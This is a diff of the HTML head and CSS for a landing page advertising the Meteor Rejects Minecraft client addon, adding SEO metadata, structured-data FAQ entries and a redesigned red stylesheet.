@@ -1,1061 +1,1662 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" prefix="og: https://ogp.me/ns#">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <title>Meteor Rejects · Crimson Edition</title>
-    <meta name="theme-color" content="#c41e3a">
-    <meta name="description" content="The #1 Meteor Client addon bringing back rejected, removed, and ported features. 58+ modules, 14+ commands, now with a blazing red theme.">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
-    <link rel="icon" type="image/png" href="https://raw.githubusercontent.com/meteorejects/meteorejects.github.io/refs/heads/main/favicon.png">
-    <link rel="shortcut icon" href="https://raw.githubusercontent.com/meteorejects/meteorejects.github.io/refs/heads/main/favicon.png">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        :root {
-            --bg-dark: #0a0507;
-            --bg-darker: #030101;
-            --bg-card: rgba(25, 10, 15, 0.75);
-            --bg-nav: rgba(10, 5, 7, 0.92);
-            --text: #ffeaea;
-            --text-secondary: #f0bcbc;
-            --border: #5a2a2a;
-            --accent: #c41e3a;
-            --accent-glow: #e63946;
-            --accent-dark: #9b1d2c;
-            --accent-gradient: linear-gradient(135deg, #c41e3a 0%, #e63946 70%, #ff6b6b 100%);
-            --badge-bg: rgba(80, 30, 35, 0.8);
-            --badge-border: #a54a4a;
-            --input-bg: #1e1012;
-            --shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.6);
-            --shadow-glow: 0 0 20px rgba(196, 30, 58, 0.4);
-            --highlight: rgba(255, 80, 100, 0.3);
-        }
-
-        body.light {
-            --bg-dark: #fff5f5;
-            --bg-darker: #ffe8e8;
-            --bg-card: rgba(255, 245, 245, 0.9);
-            --bg-nav: rgba(255, 240, 240, 0.95);
-            --text: #3a1a1a;
-            --text-secondary: #8b4b4b;
-            --border: #ffcccc;
-            --accent: #c41e3a;
-            --accent-glow: #e65a6b;
-            --badge-bg: #ffe0e0;
-            --badge-border: #ffaaaa;
-            --input-bg: #ffffff;
-            --shadow: 0 8px 20px rgba(0, 0, 0, 0.08);
-            --shadow-glow: 0 0 15px rgba(196, 30, 58, 0.2);
-        }
-
-        body {
-            font-family: 'Inter', system-ui, -apple-system, sans-serif;
-            background: var(--bg-dark);
-            color: var(--text);
-            line-height: 1.5;
-            transition: background 0.3s, color 0.2s;
-            overflow-x: hidden;
-        }
-
-        body::before {
-            content: "";
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMDAiIGhlaWdodD0iMzAwIj48ZmlsdGVyIGlkPSJmIj48ZmVUdXJidWxlbmNlIHR5cGU9ImZyYWN0YWxOb2lzZSIgYmFzZUZyZXF1ZW5jeT0iLjciIG51bU9jdGF2ZXM9IjMiLz48L2ZpbHRlcj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWx0ZXI9InVybCgjZikiIG9wYWNpdHk9IjAuMDYiLz48L3N2Zz4=');
-            background-repeat: repeat;
-            pointer-events: none;
-            z-index: 0;
-            opacity: 0.3;
-        }
-
-        .container {
-            max-width: 1300px;
-            margin: 0 auto;
-            padding: 0 28px;
-            position: relative;
-            z-index: 1;
-        }
-
-        .navbar {
-            position: sticky;
-            top: 0;
-            z-index: 1000;
-            background: var(--bg-nav);
-            backdrop-filter: blur(16px);
-            border-bottom: 1px solid var(--border);
-            padding: 0.7rem 0;
-            box-shadow: 0 2px 15px rgba(196, 30, 58, 0.1);
-        }
-
-        .nav-container {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            flex-wrap: wrap;
-            gap: 1rem;
-        }
-
-        .logo {
-            font-size: 1.8rem;
-            font-weight: 800;
-            background: var(--accent-gradient);
-            -webkit-background-clip: text;
-            background-clip: text;
-            -webkit-text-fill-color: transparent;
-            text-decoration: none;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            letter-spacing: -0.5px;
-        }
-
-        .logo i {
-            background: none;
-            -webkit-text-fill-color: var(--accent);
-            font-size: 2rem;
-            filter: drop-shadow(0 0 6px var(--accent));
-        }
-
-        .nav-links {
-            display: flex;
-            gap: 0.3rem;
-            flex-wrap: wrap;
-            align-items: center;
-        }
-
-        .nav-link {
-            color: var(--text-secondary);
-            text-decoration: none;
-            padding: 0.5rem 1.2rem;
-            border-radius: 40px;
-            font-weight: 500;
-            transition: all 0.25s ease;
-            font-size: 0.95rem;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .nav-link::after {
-            content: '';
-            position: absolute;
-            bottom: 0;
-            left: 50%;
-            width: 0;
-            height: 2px;
-            background: var(--accent-glow);
-            transition: all 0.3s;
-            transform: translateX(-50%);
-        }
-
-        .nav-link:hover::after,
-        .nav-link.active::after {
-            width: 70%;
-        }
-
-        .nav-link:hover, .nav-link.active {
-            color: var(--text);
-            background: rgba(196, 30, 58, 0.2);
-        }
-
-        .theme-toggle {
-            background: var(--bg-card);
-            border: 1px solid var(--border);
-            color: var(--text);
-            padding: 0.5rem 1rem;
-            border-radius: 40px;
-            cursor: pointer;
-            transition: 0.2s;
-        }
-
-        .hero {
-            padding: 5rem 0 3rem;
-            text-align: center;
-            position: relative;
-        }
-
-        .hero-glow {
-            position: absolute;
-            top: 20%;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 500px;
-            height: 500px;
-            background: radial-gradient(circle, rgba(196,30,58,0.25) 0%, transparent 70%);
-            filter: blur(60px);
-            pointer-events: none;
-            z-index: 0;
-        }
-
-        .hero-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            background: rgba(196, 30, 58, 0.2);
-            backdrop-filter: blur(4px);
-            padding: 0.4rem 1.2rem;
-            border-radius: 60px;
-            font-size: 0.8rem;
-            font-weight: 500;
-            border: 1px solid var(--accent);
-            margin-bottom: 1.8rem;
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0% { box-shadow: 0 0 0 0 rgba(196,30,58,0.4); }
-            70% { box-shadow: 0 0 0 10px rgba(196,30,58,0); }
-            100% { box-shadow: 0 0 0 0 rgba(196,30,58,0); }
-        }
-
-        .hero h1 {
-            font-size: 4.5rem;
-            font-weight: 800;
-            background: var(--accent-gradient);
-            -webkit-background-clip: text;
-            background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 1.2rem;
-            letter-spacing: -2px;
-            position: relative;
-            z-index: 1;
-            animation: fadeInUp 0.8s ease;
-        }
-
-        .hero p {
-            font-size: 1.2rem;
-            max-width: 720px;
-            margin: 0 auto 2rem;
-            color: var(--text-secondary);
-            position: relative;
-            z-index: 1;
-            animation: fadeInUp 0.8s 0.1s both;
-        }
-
-        .btn-group {
-            display: flex;
-            justify-content: center;
-            gap: 1rem;
-            flex-wrap: wrap;
-            position: relative;
-            z-index: 1;
-        }
-
-        .btn {
-            display: inline-flex;
-            align-items: center;
-            gap: 10px;
-            background: var(--accent);
-            border: none;
-            padding: 0.85rem 2rem;
-            border-radius: 50px;
-            font-weight: 600;
-            color: white;
-            text-decoration: none;
-            transition: all 0.25s cubic-bezier(0.2, 0.9, 0.4, 1.1);
-            cursor: pointer;
-            font-size: 0.95rem;
-            position: relative;
-            overflow: hidden;
-            z-index: 1;
-        }
-
-        .btn::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
-            transition: left 0.5s;
-            z-index: -1;
-        }
-
-        .btn:hover::before {
-            left: 100%;
-        }
-
-        .btn:hover {
-            transform: translateY(-3px);
-            background: var(--accent-glow);
-            box-shadow: var(--shadow-glow);
-        }
-
-        .btn-outline {
-            background: transparent;
-            border: 1px solid var(--border);
-            color: var(--text);
-        }
-
-        .btn-outline:hover {
-            background: var(--bg-card);
-            border-color: var(--accent);
-        }
-
-        .stats-grid {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            gap: 1.8rem;
-            margin: 3rem 0 2rem;
-        }
-
-        .stat-card {
-            background: var(--bg-card);
-            backdrop-filter: blur(12px);
-            border-radius: 32px;
-            padding: 1.2rem 2rem;
-            border: 1px solid var(--border);
-            text-align: center;
-            min-width: 140px;
-            transition: all 0.2s;
-            animation: fadeInUp 0.6s both;
-        }
-
-        .stat-card:hover {
-            border-color: var(--accent);
-            transform: translateY(-5px);
-            box-shadow: var(--shadow-glow);
-        }
-
-        .stat-number {
-            font-size: 2.5rem;
-            font-weight: 800;
-            color: var(--accent);
-        }
-
-        .control-bar {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 1.2rem;
-            margin-bottom: 2rem;
-        }
-
-        .search-box {
-            flex: 1;
-            min-width: 260px;
-            position: relative;
-        }
-
-        .search-box i {
-            position: absolute;
-            left: 18px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: var(--text-secondary);
-        }
-
-        .search-box input {
-            width: 100%;
-            padding: 0.85rem 1rem 0.85rem 3rem;
-            border-radius: 50px;
-            border: 1px solid var(--border);
-            background: var(--input-bg);
-            color: var(--text);
-            font-size: 0.9rem;
-            transition: 0.2s;
-        }
-
-        .search-box input:focus {
-            border-color: var(--accent);
-            outline: none;
-            box-shadow: 0 0 0 2px rgba(196,30,58,0.3);
-        }
-
-        .version-filter {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 0.6rem;
-            background: var(--bg-card);
-            padding: 0.4rem 1rem;
-            border-radius: 60px;
-            border: 1px solid var(--border);
-        }
-
-        .filter-pill {
-            background: transparent;
-            border: 1px solid var(--badge-border);
-            color: var(--text-secondary);
-            padding: 0.4rem 1.1rem;
-            border-radius: 40px;
-            cursor: pointer;
-            font-size: 0.8rem;
-            font-weight: 500;
-            transition: 0.15s;
-        }
-
-        .filter-pill.active, .filter-pill:hover {
-            background: var(--accent);
-            border-color: var(--accent);
-            color: white;
-        }
-
-        .modules-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
-            gap: 1.5rem;
-            margin: 1.5rem 0;
-        }
-
-        .module-card {
-            background: var(--bg-card);
-            backdrop-filter: blur(8px);
-            border-radius: 28px;
-            padding: 1.4rem;
-            border: 1px solid var(--border);
-            transition: all 0.25s ease;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .module-card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: radial-gradient(circle at var(--x, 50%) var(--y, 50%), rgba(196,30,58,0.1), transparent 70%);
-            opacity: 0;
-            transition: opacity 0.3s;
-            pointer-events: none;
-        }
-
-        .module-card:hover::before {
-            opacity: 1;
-        }
-
-        .module-card:hover {
-            border-color: var(--accent);
-            transform: translateY(-5px);
-            box-shadow: var(--shadow-glow);
-        }
-
-        .module-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 0.7rem;
-        }
-
-        .module-name {
-            font-weight: 700;
-            font-size: 1.2rem;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .module-tags {
-            margin: 0.6rem 0;
-        }
-
-        .tag {
-            display: inline-block;
-            background: var(--badge-bg);
-            border-radius: 20px;
-            padding: 0.2rem 0.7rem;
-            font-size: 0.7rem;
-            font-weight: 500;
-            margin-right: 0.4rem;
-            margin-bottom: 0.3rem;
-            color: var(--text-secondary);
-            border: 1px solid var(--badge-border);
-        }
-
-        .commands-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
-            gap: 0.8rem;
-            margin: 2rem 0;
-        }
-
-        .command-card {
-            background: var(--bg-card);
-            border-radius: 60px;
-            padding: 0.75rem 1.2rem;
-            border: 1px solid var(--border);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            transition: 0.15s;
-        }
-
-        .command-card:hover {
-            border-color: var(--accent);
-            transform: translateX(4px);
-        }
-
-        .command-name {
-            font-family: monospace;
-            font-weight: 600;
-            font-size: 0.9rem;
-        }
-
-        .version-downloads {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            gap: 1.5rem;
-            margin: 2rem 0;
-        }
-
-        .version-card {
-            background: var(--bg-card);
-            border-radius: 32px;
-            padding: 1.2rem 1.8rem;
-            border: 1px solid var(--border);
-            text-align: center;
-            min-width: 160px;
-            transition: all 0.2s;
-        }
-
-        .version-card:hover {
-            transform: translateY(-5px);
-            border-color: var(--accent);
-            box-shadow: var(--shadow-glow);
-        }
-
-        .version-number {
-            font-size: 1.3rem;
-            font-weight: 700;
-            color: var(--accent);
-        }
-
-        .download-btn-small {
-            display: inline-block;
-            margin-top: 0.8rem;
-            background: var(--accent);
-            padding: 0.4rem 1rem;
-            border-radius: 30px;
-            color: white;
-            text-decoration: none;
-            font-size: 0.8rem;
-            transition: 0.2s;
-        }
-
-        .download-btn-small:hover {
-            background: var(--accent-glow);
-            transform: scale(1.02);
-        }
-
-        .footer {
-            margin-top: 5rem;
-            padding: 2rem 0;
-            border-top: 1px solid var(--border);
-            text-align: center;
-            color: var(--text-secondary);
-        }
-
-        .back-to-top {
-            position: fixed;
-            bottom: 2rem;
-            right: 2rem;
-            background: var(--accent);
-            width: 48px;
-            height: 48px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            opacity: 0;
-            transition: opacity 0.2s;
-            border: none;
-            color: white;
-            z-index: 99;
-            box-shadow: var(--shadow);
-        }
-
-        .back-to-top.visible { opacity: 1; }
-
-        .section-highlight {
-            animation: glowPulse 0.5s ease;
-        }
-
-        @keyframes glowPulse {
-            0% { box-shadow: 0 0 0 0 var(--accent); background-color: rgba(196,30,58,0.1); }
-            100% { box-shadow: 0 0 0 8px transparent; background-color: transparent; }
-        }
-
-        @keyframes fadeInUp {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        section {
-            scroll-margin-top: 90px;
-        }
-
-        hr {
-            border-color: var(--border);
-            margin: 2rem 0;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>Meteor Rejects – #1 Meteor Client Addon | 58+ Modules for Minecraft 1.21</title>
+<meta name="description" content="Meteor Rejects is the #1 free addon for Meteor Client, restoring 58+ rejected and removed modules, 14+ commands. Supports Minecraft 1.21.0, 1.21.4, 1.21.11. Free & open source.">
+<meta name="keywords" content="meteor rejects, meteor client addon, minecraft fabric addon, meteor client modules, anticope meteor, minecraft pvp client, aim assist meteor, removed meteor modules, meteor client 1.21, free minecraft client addon">
+<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+<meta name="author" content="AntiCope">
+<link rel="canonical" href="https://meteorejects.github.io/">
+<meta name="theme-color" content="#c0192e">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://meteorejects.github.io/">
+<meta property="og:title" content="Meteor Rejects – #1 Meteor Client Addon | 58+ Modules">
+<meta property="og:description" content="Free Meteor Client addon restoring 58+ rejected/removed modules. Supports Minecraft 1.21–1.21.11. Download now.">
+<meta property="og:image" content="https://raw.githubusercontent.com/meteorejects/meteorejects.github.io/refs/heads/main/favicon.png">
+<meta property="og:site_name" content="Meteor Rejects">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Meteor Rejects – Meteor Client Addon">
+<meta name="twitter:description" content="58+ modules, 14+ commands. The #1 addon for Meteor Client. Free & open source.">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/meteorejects/meteorejects.github.io/refs/heads/main/favicon.png">
+
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"SoftwareApplication","name":"Meteor Rejects","applicationCategory":"GameApplication","operatingSystem":"Windows, macOS, Linux","description":"A free open-source addon for Meteor Client restoring 58+ rejected and removed Minecraft modules. Supports 1.21.0, 1.21.4, 1.21.11.","url":"https://meteorejects.github.io/","author":{"@type":"Person","name":"AntiCope","url":"https://github.com/AntiCope"},"license":"https://opensource.org/licenses/MIT","softwareVersion":"1.21.11","downloadUrl":"https://raw.githubusercontent.com/meteorejects/meteorejects.github.io/refs/heads/main/meteor-rejects-addon-1.21.11.jar","offers":{"@type":"Offer","price":"0","priceCurrency":"USD"}}</script>
+
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"FAQPage","mainEntity":[{"@type":"Question","name":"What is Meteor Rejects?","acceptedAnswer":{"@type":"Answer","text":"Meteor Rejects is a free open-source addon for Meteor Client that restores rejected pull requests, removed modules, and features ported from Wurst, BleachHack, LiquidBounce, and other clients. It adds 58+ modules and 14+ commands."}},{"@type":"Question","name":"How do I install Meteor Rejects?","acceptedAnswer":{"@type":"Answer","text":"Install Meteor Client, then drop the Meteor Rejects .jar into .minecraft/mods and launch with Fabric Loader 0.15+."}},{"@type":"Question","name":"Which Minecraft versions does Meteor Rejects support?","acceptedAnswer":{"@type":"Answer","text":"Meteor Rejects supports Minecraft Java Edition 1.21.0, 1.21.4, and 1.21.11 with separate downloads for each."}},{"@type":"Question","name":"Is Meteor Rejects free?","acceptedAnswer":{"@type":"Answer","text":"Yes, fully free and MIT licensed. Source on GitHub at github.com/AntiCope/meteor-rejects."}},{"@type":"Question","name":"What is the difference between Meteor Client and Meteor Rejects?","acceptedAnswer":{"@type":"Answer","text":"Meteor Client is the base client mod. Meteor Rejects is an addon that extends it with features that were removed, rejected, or never officially included."}},{"@type":"Question","name":"What Fabric Loader version is required?","acceptedAnswer":{"@type":"Answer","text":"Fabric Loader 0.15 or newer is required alongside a Meteor Client dev build."}}]}</script>
+
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://meteorejects.github.io/"},{"@type":"ListItem","position":2,"name":"Modules","item":"https://meteorejects.github.io/#modules"},{"@type":"ListItem","position":3,"name":"Commands","item":"https://meteorejects.github.io/#commands"},{"@type":"ListItem","position":4,"name":"Download","item":"https://meteorejects.github.io/#download"},{"@type":"ListItem","position":5,"name":"FAQ","item":"https://meteorejects.github.io/#faq"}]}</script>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Outfit:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+<link rel="icon" href="https://raw.githubusercontent.com/meteorejects/meteorejects.github.io/refs/heads/main/favicon.png">
+
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;font-size:16px}
+
+:root{
+  --ink:    #04010a;
+  --ink2:   #080314;
+  --ink3:   #0d0520;
+  --glass:  rgba(12,4,22,0.72);
+  --glass2: rgba(20,8,36,0.85);
+  --nav-bg: rgba(4,1,10,0.88);
+  --text:   #f0e8ff;
+  --sub:    #b09ac8;
+  --dim:    #6a5a80;
+  --line:   rgba(160,60,100,0.18);
+  --line2:  rgba(200,80,120,0.35);
+  --r:      #c0192e;
+  --r2:     #e8304a;
+  --r3:     #ff6070;
+  --r4:     #ff9090;
+  --glow:   rgba(192,25,46,0.5);
+  --glow2:  rgba(232,48,74,0.25);
+  --grad:   linear-gradient(135deg,#c0192e 0%,#e8304a 50%,#ff6070 100%);
+  --grad2:  linear-gradient(135deg,#8b0020 0%,#c0192e 100%);
+  --shadow-hard: 0 2px 0 rgba(0,0,0,0.8);
+  --radius: 16px;
+  --radius2: 24px;
+  --radius3: 40px;
+  --max-w:  1120px;
+  --ease:   cubic-bezier(0.22,1,0.36,1);
+}
+
+body{
+  font-family:'Outfit',system-ui,sans-serif;
+  background:var(--ink);
+  color:var(--text);
+  line-height:1.6;
+  overflow-x:hidden;
+  cursor:default;
+}
+
+::-webkit-scrollbar{width:6px}
+::-webkit-scrollbar-track{background:var(--ink)}
+::-webkit-scrollbar-thumb{background:var(--r);border-radius:3px}
+::-webkit-scrollbar-thumb:hover{background:var(--r2)}
+
+#heroCanvas{
+  position:absolute;inset:0;width:100%;height:100%;
+  pointer-events:none;z-index:0;opacity:.6;
+}
+
+#cursor{
+  position:fixed;width:18px;height:18px;border-radius:50%;
+  background:rgba(192,25,46,.35);border:1.5px solid var(--r2);
+  pointer-events:none;z-index:9999;
+  transform:translate(-50%,-50%);
+  transition:width .15s var(--ease),height .15s var(--ease),background .15s;
+  mix-blend-mode:screen;
+}
+#cursor.big{width:48px;height:48px;background:rgba(192,25,46,.15)}
+
+body::before{
+  content:'';position:fixed;inset:0;
+  background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='256' height='256'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='.035'/%3E%3C/svg%3E");
+  pointer-events:none;z-index:0;opacity:.7;
+}
+
+.orb{
+  position:fixed;border-radius:50%;filter:blur(90px);
+  pointer-events:none;z-index:0;will-change:transform;
+}
+.orb-1{width:600px;height:600px;background:radial-gradient(circle,rgba(192,25,46,.15),transparent 70%);top:-15%;left:-10%}
+.orb-2{width:500px;height:500px;background:radial-gradient(circle,rgba(120,0,40,.12),transparent 70%);bottom:-10%;right:-8%}
+.orb-3{width:300px;height:300px;background:radial-gradient(circle,rgba(232,48,74,.08),transparent 70%);top:40%;left:50%;transform:translateX(-50%)}
+
+.wrap{max-width:var(--max-w);margin:0 auto;padding:0 32px;position:relative;z-index:2}
+
+#navbar{
+  position:fixed;top:0;left:0;right:0;z-index:1000;
+  padding:.9rem 0;
+  transition:background .3s,border-color .3s,padding .3s;
+}
+#navbar.scrolled{
+  background:var(--nav-bg);
+  backdrop-filter:blur(24px) saturate(180%);
+  border-bottom:1px solid var(--line2);
+  padding:.65rem 0;
+}
+.nav-inner{display:flex;align-items:center;justify-content:space-between;gap:1rem;flex-wrap:wrap}
+
+.logo{
+  font-family:'Bebas Neue',sans-serif;
+  font-size:1.9rem;letter-spacing:2px;
+  text-decoration:none;color:var(--text);
+  display:flex;align-items:center;gap:10px;
+  position:relative;
+}
+.logo-meteor{
+  width:38px;height:38px;border-radius:12px;
+  background:var(--grad);
+  display:grid;place-items:center;
+  font-size:1.1rem;color:#fff;
+  box-shadow:0 0 20px var(--glow);
+  flex-shrink:0;
+  transition:transform .3s var(--ease),box-shadow .3s;
+}
+.logo:hover .logo-meteor{transform:rotate(-8deg) scale(1.1);box-shadow:0 0 35px var(--glow)}
+.logo span{background:var(--grad);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent}
+
+.nav-links{display:flex;align-items:center;gap:4px;flex-wrap:wrap}
+.nav-a{
+  font-size:.85rem;font-weight:500;color:var(--sub);
+  text-decoration:none;padding:.45rem 1rem;border-radius:999px;
+  transition:color .2s,background .2s;letter-spacing:.3px;
+}
+.nav-a:hover,.nav-a.active{color:var(--text);background:rgba(192,25,46,.18)}
+
+.nav-dl{
+  display:inline-flex;align-items:center;gap:8px;
+  background:var(--r);color:#fff;
+  font-size:.85rem;font-weight:700;letter-spacing:.5px;
+  padding:.5rem 1.3rem;border-radius:999px;
+  text-decoration:none;
+  box-shadow:0 4px 18px rgba(192,25,46,.45);
+  transition:background .2s,transform .2s,box-shadow .2s;
+}
+.nav-dl:hover{background:var(--r2);transform:translateY(-2px);box-shadow:0 8px 26px rgba(192,25,46,.6)}
+
+#hero{
+  position:relative;min-height:100vh;
+  display:flex;align-items:center;justify-content:center;
+  text-align:center;overflow:hidden;
+  padding:120px 0 60px;
+}
+
+.hero-bg-lines{
+  position:absolute;inset:0;pointer-events:none;z-index:0;
+  background:
+    repeating-linear-gradient(0deg,transparent,transparent 79px,rgba(192,25,46,.04) 80px),
+    repeating-linear-gradient(90deg,transparent,transparent 79px,rgba(192,25,46,.04) 80px);
+}
+
+.hero-inner{position:relative;z-index:2;max-width:860px;margin:0 auto;padding:0 24px}
+
+.badge{
+  display:inline-flex;align-items:center;gap:8px;
+  font-size:.72rem;font-weight:700;letter-spacing:2px;text-transform:uppercase;
+  color:var(--r3);
+  background:rgba(192,25,46,.12);
+  border:1px solid rgba(192,25,46,.4);
+  padding:.45rem 1.3rem;border-radius:999px;
+  margin-bottom:2.2rem;
+  opacity:0;animation:riseUp .8s .1s var(--ease) forwards;
+}
+.badge-dot{
+  width:6px;height:6px;border-radius:50%;
+  background:var(--r2);
+  box-shadow:0 0 6px var(--r2);
+  animation:blink 1.6s infinite;
+}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
+
+.hero-h1{
+  font-family:'Bebas Neue',sans-serif;
+  font-size:clamp(4.5rem,13vw,9rem);
+  letter-spacing:4px;line-height:.95;
+  margin-bottom:1.2rem;
+  opacity:0;animation:riseUp .9s .25s var(--ease) forwards;
+}
+.hero-h1 .line-1{display:block;color:var(--text)}
+.hero-h1 .line-2{
+  display:block;
+  background:var(--grad);
+  -webkit-background-clip:text;background-clip:text;
+  -webkit-text-fill-color:transparent;
+  filter:drop-shadow(0 0 40px rgba(192,25,46,.5));
+}
+
+.hero-sub{
+  font-size:clamp(.95rem,2vw,1.15rem);
+  color:var(--sub);line-height:1.75;
+  max-width:580px;margin:0 auto 2.8rem;
+  opacity:0;animation:riseUp .8s .4s var(--ease) forwards;
+  font-weight:400;
+}
+
+.hero-btns{
+  display:flex;justify-content:center;gap:1rem;flex-wrap:wrap;
+  opacity:0;animation:riseUp .8s .55s var(--ease) forwards;
+}
+
+.btn-fire{
+  position:relative;display:inline-flex;align-items:center;gap:10px;
+  background:var(--grad);color:#fff;
+  font-family:'Outfit',sans-serif;font-size:.95rem;font-weight:700;
+  padding:.9rem 2.2rem;border-radius:999px;border:none;cursor:pointer;
+  text-decoration:none;overflow:hidden;
+  box-shadow:0 8px 30px rgba(192,25,46,.55);
+  transition:transform .25s var(--ease),box-shadow .25s;
+}
+.btn-fire::after{
+  content:'';position:absolute;inset:0;
+  background:linear-gradient(90deg,transparent 0%,rgba(255,255,255,.18) 50%,transparent 100%);
+  transform:translateX(-100%);
+  transition:transform .5s;
+}
+.btn-fire:hover{transform:translateY(-4px) scale(1.02);box-shadow:0 16px 45px rgba(192,25,46,.7)}
+.btn-fire:hover::after{transform:translateX(100%)}
+
+.btn-outline{
+  display:inline-flex;align-items:center;gap:10px;
+  background:rgba(255,255,255,.04);color:var(--sub);
+  font-size:.95rem;font-weight:600;
+  padding:.9rem 2.2rem;border-radius:999px;
+  border:1px solid var(--line2);text-decoration:none;
+  transition:color .2s,border-color .2s,background .2s,transform .2s;
+}
+.btn-outline:hover{color:var(--text);border-color:var(--r2);background:rgba(192,25,46,.1);transform:translateY(-3px)}
+
+.hero-stats{
+  display:flex;justify-content:center;flex-wrap:wrap;gap:0;
+  margin-top:5rem;
+  background:var(--glass);
+  backdrop-filter:blur(16px);
+  border:1px solid var(--line2);
+  border-radius:var(--radius2);
+  overflow:hidden;
+  opacity:0;animation:riseUp .8s .7s var(--ease) forwards;
+}
+.h-stat{
+  flex:1;min-width:120px;
+  padding:1.4rem 1.6rem;text-align:center;
+  border-right:1px solid var(--line);
+  transition:background .2s;
+  position:relative;
+}
+.h-stat:last-child{border-right:none}
+.h-stat:hover{background:rgba(192,25,46,.07)}
+.h-stat-n{
+  font-family:'Bebas Neue',sans-serif;
+  font-size:2.4rem;letter-spacing:1px;line-height:1;
+  background:var(--grad);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;
+}
+.h-stat-l{font-size:.72rem;font-weight:600;letter-spacing:1.5px;text-transform:uppercase;color:var(--dim);margin-top:4px}
+
+.scroll-hint{
+  position:absolute;bottom:2rem;left:50%;transform:translateX(-50%);
+  display:flex;flex-direction:column;align-items:center;gap:6px;
+  opacity:0;animation:fadeIn 1s 1.5s forwards;
+  color:var(--dim);font-size:.7rem;letter-spacing:1px;text-transform:uppercase;
+}
+.scroll-line{
+  width:1px;height:40px;
+  background:linear-gradient(to bottom,var(--r),transparent);
+  animation:scrollPulse 2s infinite;
+}
+@keyframes scrollPulse{0%,100%{opacity:.3;transform:scaleY(.6)}50%{opacity:1;transform:scaleY(1)}}
+
+section{scroll-margin-top:80px;padding:6rem 0}
+
+.sec-label{
+  display:inline-flex;align-items:center;gap:8px;
+  font-size:.68rem;font-weight:700;letter-spacing:2.5px;text-transform:uppercase;
+  color:var(--r3);margin-bottom:.8rem;
+}
+.sec-label::before{content:'';width:18px;height:1.5px;background:var(--r3)}
+
+.sec-h2{
+  font-family:'Bebas Neue',sans-serif;
+  font-size:clamp(2rem,5vw,3.2rem);
+  letter-spacing:2px;line-height:1.05;
+  margin-bottom:.6rem;color:var(--text);
+}
+.sec-sub{color:var(--sub);font-size:.95rem;max-width:520px;margin-bottom:3rem;line-height:1.7}
+
+.reveal{opacity:0;transform:translateY(32px);transition:opacity .7s var(--ease),transform .7s var(--ease)}
+.reveal.delay-1{transition-delay:.1s}
+.reveal.delay-2{transition-delay:.2s}
+.reveal.delay-3{transition-delay:.3s}
+.reveal.delay-4{transition-delay:.4s}
+.reveal.in{opacity:1;transform:none}
+
